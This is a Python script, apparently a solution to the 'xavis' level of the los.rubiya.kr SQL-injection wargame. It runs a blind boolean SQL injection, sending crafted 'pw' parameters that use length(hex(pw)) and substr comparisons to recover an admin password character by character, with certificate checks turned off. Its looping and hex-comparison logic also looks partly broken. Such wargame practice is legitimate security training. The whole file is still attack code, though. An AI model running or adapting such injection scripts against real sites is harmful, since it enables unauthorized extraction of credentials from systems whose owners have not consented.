import requests

requests.packages.urllib3.disable_warnings()
sess = requests.session()
URL = 'https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php'
headers = {'Cookie': ''}
length =0

for i in range(1, 100):
    payload1 = "?pw='||length(hex(pw))='"+str(i)+"'%23"
    res1 = sess.get(url=URL + payload1, headers=headers, verify=False)
    if 'Hello admin' in res1.text:
        print('Password Length : %d' %i)
        length =i
        break
    else:
        pass

Password = ''
for j in range(1, length):
    for i in range(0, 122):
        payload2 = "?pw=""||substr(hex(pw),"+str(j)+",1)='"+hex(i)+"'%23"
        res2 = sess.get(url=URL + payload2, headers=headers, verify=False)
        print(hex(i))
        if 'Hello admin' in res2.text:
            if 57<i<97:
                continue
            else:
                print('Password %d: %d' % (j, i))
                Password = Password + chr(i)
                break
        else:
            pass
print(Password)



